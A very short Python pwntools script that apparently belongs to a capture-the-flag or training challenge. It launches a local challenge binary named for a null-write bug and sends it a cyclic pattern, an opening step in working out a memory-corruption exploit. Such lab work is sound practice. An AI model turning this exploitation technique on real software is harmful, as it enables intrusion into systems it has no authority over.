from pwn import *

r = process("/challenge/binary-exploitation-null-write")

r.send(cyclic(0x14 + 15))
r.wait()